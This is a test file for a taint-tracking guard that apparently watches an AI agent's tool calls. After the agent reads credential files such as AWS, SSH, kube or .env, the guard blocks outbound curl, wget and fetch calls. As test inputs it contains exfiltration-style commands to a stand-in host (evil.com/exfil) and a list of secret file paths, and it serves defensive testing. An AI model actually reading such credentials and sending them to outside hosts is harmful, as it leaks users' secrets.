import { describe, it, expect, beforeEach } from "vitest";
import {
  checkAndMarkTaint,
  checkTaintViolation,
  getTaintState,
  resetTaint,
} from "./taint.js";

describe("taint tracking", () => {
  beforeEach(() => {
    resetTaint();
  });

  it("marks taint when reading ~/.aws/credentials", () => {
    checkAndMarkTaint("read_file", { path: "~/.aws/credentials" });
    expect(getTaintState().tainted).toBe(true);
    expect(getTaintState().sourcePath).toBe("~/.aws/credentials");
  });

  it("blocks outbound curl after credential read", () => {
    checkAndMarkTaint("read_file", { path: "~/.ssh/id_rsa" });
    const result = checkTaintViolation("exec", { command: "curl https://evil.com" }, []);
    expect(result.blocked).toBe(true);
    expect(result.reason).toContain("taint violation");
    expect(result.reason).toContain("evil.com");
  });

  it("allows outbound call to allowed host even when tainted", () => {
    checkAndMarkTaint("read_file", { path: "~/.aws/credentials" });
    const result = checkTaintViolation(
      "exec",
      { command: "curl https://api.openai.com/v1/chat" },
      ["api.openai.com"],
    );
    expect(result.blocked).toBe(false);
  });

  it("does not block network calls before any sensitive read", () => {
    const result = checkTaintViolation("exec", { command: "curl https://evil.com" }, []);
    expect(result.blocked).toBe(false);
  });

  it("resets cleanly between sessions", () => {
    checkAndMarkTaint("read_file", { path: "~/.aws/credentials" });
    expect(getTaintState().tainted).toBe(true);
    resetTaint();
    expect(getTaintState().tainted).toBe(false);
    expect(getTaintState().reason).toBe("");
    expect(getTaintState().taintedAt).toBeNull();
    expect(getTaintState().sourcePath).toBe("");
  });

  it("marks taint for .ssh directory access", () => {
    checkAndMarkTaint("read_file", { path: "~/.ssh/config" });
    expect(getTaintState().tainted).toBe(true);
  });

  it("marks taint for .env file access", () => {
    checkAndMarkTaint("read_file", { path: "/app/.env" });
    expect(getTaintState().tainted).toBe(true);
  });

  it("marks taint for .kube/config access", () => {
    checkAndMarkTaint("read_file", { path: "~/.kube/config" });
    expect(getTaintState().tainted).toBe(true);
  });

  it("marks taint for sensitive DB queries", () => {
    checkAndMarkTaint("query", { sql: "SELECT * FROM information_schema.tables" });
    expect(getTaintState().tainted).toBe(true);
  });

  it("marks taint for commands accessing process.env", () => {
    checkAndMarkTaint("exec", { command: "node -e 'console.log(process.env)'" });
    expect(getTaintState().tainted).toBe(true);
  });

  it("does not taint for regular file reads", () => {
    checkAndMarkTaint("read_file", { path: "/home/user/project/README.md" });
    expect(getTaintState().tainted).toBe(false);
  });

  it("blocks wget after taint", () => {
    checkAndMarkTaint("read_file", { path: "~/.aws/credentials" });
    const result = checkTaintViolation("exec", { command: "wget https://evil.com/exfil" }, []);
    expect(result.blocked).toBe(true);
  });

  it("blocks fetch tool calls when tainted", () => {
    checkAndMarkTaint("read_file", { path: "~/.ssh/id_ed25519" });
    const result = checkTaintViolation("fetch", { url: "https://evil.com" }, []);
    expect(result.blocked).toBe(true);
  });

  it("allows non-network tool calls when tainted", () => {
    checkAndMarkTaint("read_file", { path: "~/.aws/credentials" });
    const result = checkTaintViolation("write_file", { path: "/tmp/output.txt", content: "hello" }, []);
    expect(result.blocked).toBe(false);
  });

  it("only taints once (first access wins)", () => {
    checkAndMarkTaint("read_file", { path: "~/.aws/credentials" });
    const firstReason = getTaintState().reason;
    checkAndMarkTaint("read_file", { path: "~/.ssh/id_rsa" });
    expect(getTaintState().reason).toBe(firstReason);
  });
});
